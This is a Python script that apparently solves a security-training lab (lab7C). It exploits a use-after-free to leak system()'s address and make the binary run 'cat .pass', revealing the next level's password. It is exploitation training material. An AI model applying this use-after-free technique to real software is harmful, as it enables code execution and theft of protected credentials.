#!/usr/bin/python

import pexpect
import ctypes

path = '/levels/lab07/lab7C'
proc = None

# Command will be executed under lab7A's home
command = 'cat .pass'

# Distance between small_num and system:
# gdb-peda$ p/x &small_str-&system
# $11 = 0x19da37
# gdb-peda$ p/x &big_str-&system
# $11 = 0x19da86
small_distance = 0x19da37
big_distance = 0x19da86


def readall():
    data = []
    while True:
        try:
            proc.expect('\n')
            c = proc.before
            if not c: break
            data.append(c)
        except (pexpect.TIMEOUT, pexpect.EOF) as e:
            data.append(proc.before)
            break
    return data

def interact(*params):
    out = []
    for param in params:
        proc.sendline(str(param))
        out.extend(readall())
    out.extend(readall())
    return out

def shell():
    # 0x03 is a Control-C escape code.
    proc.interact('\x03')

if __name__ == '__main__':

    assert len(command) < 16, "Command must not be longer than 15 chars!"

    proc = pexpect.spawn(path, timeout=0.1, cwd='/home/lab7A/')

    print "Step 1. Leak a module base address"
    print "\t1.1. Allocate number object"
    interact("2", 1234)

    print "\t1.2. Free it"
    interact("4")

    print "\t1.3. Allocate string object"
    interact("1", "test")

    print "\t1.4. Display number's value"
    output = interact("6", 1)[3]
    system = ctypes.c_uint32(int(output[output.find(':')+2:-1])).value

    distance = small_distance
    if len(command) > 10:
        distance = big_distance
        
    system = ctypes.c_uint32(system - distance).value

    print "\t1.5. Free it"
    interact("3")

    print "\tsystem() @ 0x%0x" % system

    print "\nStep 2. Prepare UAF state"
    print "\t2.1. Allocate string object"
    interact("1", command)

    print "\t2.2. Free it"
    interact("3")

    print "\t2.3. Allocate number object"
    interact("2", system)

    print "\nStep 3. Trigger Use-After-Free condition"
    password = interact("5", 1)[3]

    print "lab7A password: " + password

